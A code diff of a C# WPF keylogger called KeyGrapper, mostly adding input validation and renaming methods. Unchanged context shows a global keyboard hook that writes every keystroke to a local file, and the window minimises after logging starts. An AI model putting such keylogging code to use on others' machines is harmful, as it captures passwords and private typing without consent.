@@ -25,9 +25,8 @@ namespace KeyGrapper
             TitleLabel.MouseLeftButtonDown += TitleLabel_MouseLeftButtonDown;
             TitleLabel.MouseMove += TitleLabel_MouseMove;
             TitleLabel.MouseLeftButtonUp += TitleLabel_MouseLeftButtonUp;
-
         }
-        
+
         private static string _logFilePath;
 
         private bool _isDragging;
@@ -79,34 +78,53 @@ namespace KeyGrapper
 
         private void StartButton_OnClick(object sender, RoutedEventArgs e)
         {
-            if (FilesLocation.Content == null)
+            if (String.Equals(FilesLocation.Content, "Click here"))
             {
-                MessageBox.Show("Please select a location to save the files");
+                MessageBox.Show("Please select a location to save the files", "KeyGrapper");
             }
             else
             {
-                _logFilePath = Path.Combine(FilesLocation.Content.ToString(), $@"{FileName.Text}.txt");
-                _hookId = SetHook(_proc);
-                MessageBox.Show("Keylogger started");
-                
-                if(TimeBox.Text == "")
+                if (FileName.Text.Contains(@"\") || FileName.Text.Contains(@"/") || FileName.Text.Contains(@":") ||
+                    FileName.Text.Contains(@"*") || FileName.Text.Contains(@"?") || FileName.Text.Contains("\"") ||
+                    FileName.Text.Contains(@"<") || FileName.Text.Contains(@">") || FileName.Text.Contains(@"|"))
                 {
-                    MessageBox.Show("Please enter a time");
+                    MessageBox.Show("Please enter a valid file name", "KeyGrapper");
                 }
                 else
                 {
-                    int time = Convert.ToInt32(TimeBox.Text);
-                    end(time);
+                    if (TimeBox.Text != "")
+                    {
+                        int time;
+
+                        bool success = Int32.TryParse(TimeBox.Text, out time);
+
+                        if (!success)
+                        {
+                            MessageBox.Show("Please enter a valid time", "KeyGrapper");
+                        }
+                        else
+                        {
+                            //start all the stuff
+                            _logFilePath = Path.Combine(FilesLocation.Content.ToString(), $"{FileName.Text}.txt");
+                            _hookId = SetHook(_proc);
+                            MessageBox.Show("Keylogger started", "KeyGrapper");
+                            WindowState = WindowState.Minimized;
+                            EndLogging(time);
+                        }
+                    }
+                    else
+                    {
+                        MessageBox.Show("Please enter a valid time", "KeyGrapper");
+                    }
                 }
             }
         }
-        
-        static async Task end(int time)
+
+        static async Task EndLogging(int time)
         {
             await Task.Delay(TimeSpan.FromSeconds(time));
-            MessageBox.Show("End of program");
+            MessageBox.Show("End of program", "Program");
             Environment.Exit(0);
-            
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -129,7 +147,7 @@ namespace KeyGrapper
 
                 string keyName = GetKeyName(key);
 
-                using (StreamWriter sw = new StreamWriter(_logFilePath, true)) // Use the specified file path
+                using (StreamWriter sw = new StreamWriter(_logFilePath, true))
                 {
                     sw.Write(keyName + " ");
                 }
@@ -170,7 +188,8 @@ namespace KeyGrapper
         }
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
+            uint dwThreadId);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -181,7 +200,5 @@ namespace KeyGrapper
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-
     }
 }
